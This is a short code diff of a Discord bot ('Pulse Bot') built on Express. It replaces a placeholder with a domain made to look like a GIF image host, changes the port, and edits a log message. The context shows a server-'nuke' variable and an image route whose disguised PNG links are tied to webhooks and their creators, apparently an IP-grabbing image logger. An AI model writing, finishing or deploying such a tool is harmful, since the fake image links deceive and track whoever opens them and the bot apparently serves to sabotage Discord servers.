@@ -5,7 +5,7 @@ const app = express();
 const crypto = require('crypto');
 
 const TOKEN = process.env.TOKEN;
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 9626;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 
 if (!TOKEN) {
@@ -26,7 +26,7 @@ let nukeGuildId = null;
 let startTime = Date.now();
 
 app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
-app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));
+app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));
 
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
@@ -150,7 +150,7 @@ client.on('interactionCreate', async (interaction) => {
             }
             
             const id = crypto.randomBytes(6).toString('hex');
-            const url = `https://YOUR-WISPBYTE-URL.com/img/${id}.png`;
+            const url = `https://image-klipy-gif.wisp.uno/img/${id}.png`;
             links.set(id, { webhook: wh, user: interaction.user.tag, created: Date.now() });
             
             const embed = new EmbedBuilder()
